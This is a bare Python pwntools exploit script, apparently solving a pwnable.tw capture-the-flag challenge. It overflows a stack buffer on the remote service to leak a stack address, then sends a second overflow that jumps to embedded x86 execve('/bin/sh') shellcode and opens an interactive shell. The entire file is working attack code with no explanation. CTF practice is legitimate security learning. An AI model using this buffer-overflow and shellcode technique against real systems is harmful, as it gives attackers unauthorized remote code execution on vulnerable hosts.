from pwn import *

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

server=remote("chall.pwnable.tw",10000)
print server.recvuntil(':')
server.send("A"*20+p32(0x08048087))

addr1=u32(server.recv()[:4])
addr2=int(hex(addr1+0x14),16)

payload="A"*20 + p32(addr2) + shellcode

server.send(payload)
server.interactive()
